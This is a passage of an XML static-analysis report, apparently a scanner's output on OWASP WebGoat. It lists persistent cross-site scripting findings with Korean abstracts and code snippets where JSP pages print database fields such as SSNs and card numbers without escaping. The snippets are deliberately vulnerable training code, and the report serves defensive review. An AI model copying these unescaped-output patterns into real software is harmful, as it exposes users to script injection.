<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="A493155D278EDB3DFFB05B30943C65A7" ruleID="94B3FB0E-4AED-4006-9CDD-B2B1C13747EE">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>DatabaseUtilities.java의 writeTable() 메서드가 154 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>DatabaseUtilities.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/DatabaseUtilities.java</FilePath>
<LineStart>154</LineStart>
<Snippet>		for (int i = 1; i &lt; (numColumns + 1); i++)
		{
		    row.addElement(new TD(results.getString(i).replaceAll(" ",
			    "&amp;nbsp;")));
		}</Snippet>
<TargetFunction>org.apache.ecs.html.TD.TD()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>SqlNumericInjection.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SqlNumericInjection.java</FilePath>
<LineStart>208</LineStart>
<Snippet>			ResultSet.CONCUR_READ_ONLY);
		statement.setInt(1, Integer.parseInt(station));
		ResultSet results = statement.executeQuery();

		if ((results != null) &amp;&amp; (results.first() == true))</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="7AE2E156860691B95E538D8DCD258291" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>Login.jsp의 _jspService() 메서드가 25 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>Login.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/Login.jsp</FilePath>
<LineStart>25</LineStart>
<Snippet>						EmployeeStub stub = (EmployeeStub) i.next();
					%&gt;
			      	&lt;option value="&lt;%=Integer.toString(stub.getId())%&gt;"&gt;&lt;%=stub.getFirstName() + " " + stub.getLastName() + " (" + stub.getRole() + ")"%&gt;&lt;/option&gt;
					&lt;%}%&gt;
	                &lt;/select&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/ViewProfile.java</FilePath>
<LineStart>112</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="D1C919412386888CBA1198BA93770598" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 53 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/EditProfile.jsp</FilePath>
<LineStart>53</LineStart>
<Snippet>			    	&lt;/TD&gt;
			    	&lt;TD&gt;
			    		&lt;input class="lesson_text_db" name="&lt;%=RoleBasedAccessControl.SSN%&gt;" type="text" value="&lt;%=employee.getSsn()%&gt;"/&gt; 
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/ViewProfile.java</FilePath>
<LineStart>118</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="5EAC09AAF366B603CEF37AE90C2C36B0" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 67 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/ViewProfile.jsp</FilePath>
<LineStart>67</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;span class="lesson_text_db"&gt;&lt;%=employee.getCcn()%&gt;&lt;/span&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/ViewProfile.java</FilePath>
<LineStart>112</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="817FAD808A2235EF72D07A808D8636E6" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 16 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/ViewProfile.jsp</FilePath>
<LineStart>16</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;%=employee.getFirstName()%&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/ViewProfile.java</FilePath>
<LineStart>112</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="AF07715C6746DE48BBA59CE3F8613556" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 80 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/ViewProfile.jsp</FilePath>
<LineStart>80</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;%=employee.getPersonalDescription()%&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="A1D33ABF4E213F056CEF5B740E1F7AFC" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 109 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/EditProfile.jsp</FilePath>
<LineStart>109</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=SQLInjection.DISCIPLINARY_DATE%&gt;" type="text" value="&lt;%=employee.getDisciplinaryActionDate()%&gt;"/&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/ViewProfile.java</FilePath>
<LineStart>132</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="8074D6C6549B20C18D358A3D0E95BE25" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 123 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/EditProfile.jsp</FilePath>
<LineStart>123</LineStart>
<Snippet>                       	&lt;td width="81"&gt;
 							&lt;input name="&lt;%=SQLInjection.EMPLOYEE_ID%&gt;" type="hidden" value="&lt;%=employee.getId()%&gt;"&gt;
							&lt;input name="&lt;%=SQLInjection.TITLE%&gt;" type="hidden" value="&lt;%=employee.getTitle()%&gt;"&gt;
							&lt;input type="submit" name="action" value="&lt;%=SQLInjection.UPDATEPROFILE_ACTION%&gt;"/&gt;
						&lt;/td&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="200B5BD428F7777D7F47E70190869A3C" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>Login.jsp의 _jspService() 메서드가 25 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>Login.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/Login.jsp</FilePath>
<LineStart>25</LineStart>
<Snippet>						EmployeeStub stub = (EmployeeStub) i.next();
					%&gt;
			      	&lt;option value="&lt;%=Integer.toString(stub.getId())%&gt;"&gt;&lt;%=stub.getFirstName() + " " + stub.getLastName() + " (" + stub.getRole() + ")"%&gt;&lt;/option&gt;
					&lt;%}%&gt;
	                &lt;/select&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ListStaff.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/ListStaff.java</FilePath>
<LineStart>98</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		answer_results.beforeFirst();
		while (answer_results.next())</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="B9B54D83E8C1242216135B3FEB003788" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 47 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/EditProfile.jsp</FilePath>
<LineStart>47</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=SQLInjection.START_DATE%&gt;" type="text" value="&lt;%=employee.getStartDate()%&gt;"/&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/ViewProfile.java</FilePath>
<LineStart>118</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="A14CD3544DE6EDE740A8FB607A2A50C7" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 79 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/EditProfile.jsp</FilePath>
<LineStart>79</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD colspan="3"&gt;
						&lt;input name="&lt;%=RoleBasedAccessControl.DESCRIPTION%&gt;" type="text" class="lesson_text_db" value="&lt;%=employee.getPersonalDescription()%&gt;" size="58"/&gt;
					&lt;/TD&gt;
				&lt;TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/ViewProfile.java</FilePath>
<LineStart>132</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="F80D8C55DA87BA69F6D096347C4566B8" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ListStaff.jsp의 _jspService() 메서드가 25 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ListStaff.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/ListStaff.jsp</FilePath>
<LineStart>25</LineStart>
<Snippet>					{
						EmployeeStub stub = (EmployeeStub) i.next();%&gt;
						&lt;option value="&lt;%=Integer.toString(stub.getId())%&gt;"&gt;&lt;%=stub.getFirstName() + " " + stub.getLastName()+ " (" + stub.getRole() + ")"%&gt;&lt;/option&gt;&lt;%
					}%&gt;
  &lt;/select&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="50D35E586938101794F8CCEDF4B7B522" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ListStaff.jsp의 _jspService() 메서드가 25 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ListStaff.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/ListStaff.jsp</FilePath>
<LineStart>25</LineStart>
<Snippet>					{
						EmployeeStub stub = (EmployeeStub) i.next();%&gt;
						&lt;option value="&lt;%=Integer.toString(stub.getId())%&gt;"&gt;&lt;%=stub.getFirstName() + " " + stub.getLastName()+ " (" + stub.getRole() + ")"%&gt;&lt;/option&gt;&lt;%
					}%&gt;
  &lt;/select&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ListStaff.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/ListStaff.java</FilePath>
<LineStart>98</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		answer_results.beforeFirst();
		while (answer_results.next())</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="A2844995C04E714DAA188947FBE0174B" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 99 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/ViewProfile.jsp</FilePath>
<LineStart>99</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;%=employee.getDisciplinaryActionNotes()%&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="778B5B996D56113454FA45D01999888F" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 58 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/ViewProfile.jsp</FilePath>
<LineStart>58</LineStart>
<Snippet>			    	&lt;/TD&gt;
			    	&lt;TD&gt;
			    		&lt;%=employee.getSsn()%&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/ViewProfile.java</FilePath>
<LineStart>112</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="69E2D2478BB949A4B4AC44E30EFF4B15" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ListStaff.jsp의 _jspService() 메서드가 8 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ListStaff.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/ListStaff.jsp</FilePath>
<LineStart>8</LineStart>
<Snippet>	int myUserId = webSession.getUserIdInLesson();
%&gt;
	&lt;div class="lesson_title_box"&gt;&lt;strong&gt;Welcome Back &lt;/strong&gt;&lt;span class="lesson_text_db"&gt;&lt;%=webSession.getUserNameInLesson()%&gt;&lt;/span&gt; - Staff Listing Page&lt;/div&gt;
		&lt;br&gt;
		&lt;br&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>DefaultLessonAction.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/DefaultLessonAction.java</FilePath>
<LineStart>203</LineStart>
<Snippet>			{
				Statement answer_statement = WebSession.getConnection(s).createStatement( ResultSet.TYPE_SCROLL_INSENSITIVE, ResultSet.CONCUR_READ_ONLY );
				ResultSet answer_results = answer_statement.executeQuery( query );
				if (answer_results.next())
					name = answer_results.getString("first_name");</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="05EB9A3BE076F816781509037C2EC722" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 38 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/ViewProfile.jsp</FilePath>
<LineStart>38</LineStart>
<Snippet>						City/State: 
					&lt;TD&gt;
						&lt;%=employee.getAddress2()%&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/ViewProfile.java</FilePath>
<LineStart>132</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="39A17C0A4D7F488BA740095BDAD8F7A3" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 67 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/EditProfile.jsp</FilePath>
<LineStart>67</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=SQLInjection.CCN%&gt;" type="text" value="&lt;%=employee.getCcn()%&gt;"/&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/ViewProfile.java</FilePath>
<LineStart>118</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="8F5A2A0622B16FEEF4DCA5F6C2EDC442" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ListStaff.jsp의 _jspService() 메서드가 25 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ListStaff.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/ListStaff.jsp</FilePath>
<LineStart>25</LineStart>
<Snippet>					{
						EmployeeStub stub = (EmployeeStub) i.next();%&gt;
						&lt;option value="&lt;%=Integer.toString(stub.getId())%&gt;"&gt;&lt;%=stub.getFirstName() + " " + stub.getLastName()+ " (" + stub.getRole() + ")"%&gt;&lt;/option&gt;&lt;%
					}%&gt;
  &lt;/select&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ListStaff.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/ListStaff.java</FilePath>
<LineStart>98</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		answer_results.beforeFirst();
		while (answer_results.next())</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="AE2352D6F15CDC90C62E3EDD616F1818" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
